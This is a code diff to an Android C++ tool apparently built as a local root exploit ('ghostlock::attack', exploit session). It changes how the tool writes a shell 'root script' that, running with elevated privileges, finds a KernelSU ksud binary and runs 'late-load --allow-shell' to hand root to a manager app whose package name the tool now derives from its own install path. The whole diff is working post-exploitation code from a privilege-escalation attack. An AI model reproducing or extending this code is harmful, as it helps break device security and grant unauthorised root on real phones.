@@ -17,6 +17,7 @@
 #include <string_view>
 #include <linux/perf_event.h>
 #include <sys/ioctl.h>
+#include <unistd.h>
 #include <sys/mman.h>
 #include <sys/utsname.h>
 
@@ -223,7 +224,32 @@ namespace ghostlock::attack {
         }
     }
 
+    /* The manager package this payload was installed for. /proc/self/exe is
+     * /data/app/~~x==/<package>-<suffix>/lib/arm64/libghostlock.so, so the
+     * directory name before the first hyphen is the runtime applicationId. A
+     * hardcoded package would make late-load restart another manager (and hand
+     * it the root) on a spoofed/renamed build. */
+    static std::string manager_package(void) {
+        std::array<char, 512> exe{};
+        const ssize_t len = readlink("/proc/self/exe", exe.data(), exe.size() - 1);
+        if (len > 0) {
+            const std::string_view path(exe.data(), static_cast<size_t>(len));
+            const size_t lib = path.rfind("/lib/");
+            const size_t slash = lib == std::string_view::npos
+                                     ? std::string_view::npos
+                                     : path.rfind('/', lib - 1);
+            if (lib != std::string_view::npos && slash != std::string_view::npos) {
+                const std::string_view dir = path.substr(slash + 1, lib - slash - 1);
+                const std::string_view pkg = dir.substr(0, dir.find('-'));
+                /* Android package names contain dots and never a hyphen. */
+                if (pkg.find('.') != std::string_view::npos) return std::string(pkg);
+            }
+        }
+        return std::string("com.agnessu.yakayn");
+    }
+
     void write_root_script(void) {
+        const std::string manager = manager_package();
         std::string script(12288, '\0');
         support::UniqueFd sfd(
             open((config::runtime_config_snapshot().root_script_path.c_str()), O_WRONLY | O_CREAT | O_TRUNC, 0755));
@@ -239,7 +265,7 @@ namespace ghostlock::attack {
             "HOME_DIR='%s'\n"
             "LOG='%s'\n"
             "SAFE_MODE=%d\n"
-            "KSUD=\"$HOME_DIR/ksud\"\n"
+            "KSUD='%s'\n"
             "echo \"[*] root script start uid=$(id -u) euid=$(id -u)\" >\"$LOG\"\n"
             "chmod 644 \"$LOG\" 2>/dev/null\n"
             "echo \"[*] seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | tr '\\n' ' ')\" >>\"$LOG\"\n"
@@ -251,6 +277,9 @@ namespace ghostlock::attack {
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/com.resukisu.resukisu*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
+            "fi\n"
+            "if [ ! -x \"$KSUD\" ]; then\n"
+            "  KSUD=$(find /data/app -path '*/org.bakasu.bakasu-*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
             "fi\n"
             "if [ ! -x \"$KSUD\" ]; then\n"
             "  KSUD=$(find /data/app -path '*/com.kowx712.supermanager*/lib/arm64/libksud.so' 2>/dev/null | head -1)\n"
@@ -388,7 +417,7 @@ namespace ghostlock::attack {
             "  fi\n"
             "  echo \"[*] late-load kmi=$KMI\" >>\"$LOG\"\n"
             "  chmod 755 \"$KSUD\" 2>/dev/null\n"
-            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell --package-name com.agnessu.yakayn >>\"$LOG\" 2>&1\n"
+            "  \"$KSUD\" late-load --kmi \"$KMI\" --allow-shell --package-name '%s' >>\"$LOG\" 2>&1\n"
             "  echo \"[*] late-load exit=$?\" >>\"$LOG\"\n"
             "fi\n"
             "echo \"[*] temp su uid=$(id -u); watching kernelsu.ko\" >>\"$LOG\"\n"
@@ -412,7 +441,9 @@ namespace ghostlock::attack {
             (config::runtime_config_snapshot().home_dir.c_str()),
             (config::runtime_config_snapshot().ksu_log_path.c_str()),
             session::g_exploit_session.profile.safe_mode() ? 1 : 0,
-            (config::runtime_config_snapshot().debug_dir.c_str()));
+            (config::runtime_config_snapshot().ksud_path.c_str()),
+            (config::runtime_config_snapshot().debug_dir.c_str()),
+            manager.c_str());
         if (n < 0 || n >= static_cast<int32_t>(script.size())) {
             pr_warning("root script too long\n");
             return;
@@ -422,6 +453,7 @@ namespace ghostlock::attack {
         }
         sfd.reset();
         chmod((config::runtime_config_snapshot().root_script_path.c_str()), 0755);
+        pr_info("root script manager package=%s\n", manager.c_str());
         pr_info("root script written path=%s bytes=%d\n", (config::runtime_config_snapshot().root_script_path.c_str()),
                 n);
     }
